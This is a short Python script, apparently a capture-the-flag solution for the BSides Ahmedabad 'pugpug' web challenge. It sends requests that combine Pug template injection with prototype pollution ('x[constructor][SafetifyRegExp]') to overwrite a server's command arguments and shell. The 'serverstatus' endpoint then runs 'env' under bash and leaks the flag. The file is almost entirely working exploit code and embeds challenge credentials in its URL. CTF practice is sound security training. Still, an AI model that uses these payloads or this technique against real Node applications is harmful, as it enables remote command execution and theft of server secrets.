import requests

host= 'http://ZoNPIsEFlazDAHWj:LOkRjDgreHuhWPNm@pugpug.web.ctf.bsidesahmedabad.in:63928/'

#read ps
x=requests.get(host+'serverstatus')
print(x.text)
# setting args ;env
x=requests.get(host+'?name=Guest&content=b+%23{options.args%3d[%2f;env%2f.source]}&x=x&x[constructor][SafetifyRegExp]=x')
assert(x.text.find('env')!=-1)

#setting shell=bash
x=requests.get(host+'?name=Guest&content=b+%23{options.options.shell%3d/bash/.source}&x=x&x[constructor][SafetifyRegExp]=x')
assert(x.text.find('bash')!=-1)

#read flag
x=requests.get(host+'serverstatus')
print(x.text)
